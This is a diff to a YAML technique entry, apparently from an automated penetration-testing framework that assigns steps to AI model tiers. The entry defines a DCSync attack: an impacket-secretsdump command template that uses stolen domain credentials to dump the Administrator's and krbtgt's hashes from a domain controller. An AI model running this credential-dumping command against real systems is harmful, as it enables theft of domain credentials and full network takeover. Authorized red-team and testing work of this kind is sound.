@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-secretsdump '{domain}/{username}:{password}@{target_ip}'
-  -just-dc-user Administrator
+command_template: impacket-secretsdump '{domain}/{username}:{password}@{target_ip}' -just-dc-user Administrator
 parser: impacket_parser
 expected_effects:
 - krbtgt_hash
@@ -17,6 +16,18 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: DCSync replicates credentials via DRSUAPI (GetNCChanges). Requires DS-Replication-Get-Changes
-  + DS-Replication-Get-Changes-All. Dumps individual accounts or full NTDS.
+mechanism: DCSync replicates credentials via DRSUAPI (GetNCChanges). Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All.
+  Dumps individual accounts or full NTDS.
 hacktricks_ref: windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
+references:
+  ocd_mindmap_node_ids:
+  - 19fc58a688
+  - 1bc02a8a46
+  - 2817aeb958
+  - 2d0198bf76
+  - 3eb5aff533
+  - 4c2736b630
+  - 9a2cae2e0f
+  - ac2086bd3d
+  - d1415a6191
+  - d14de0c864
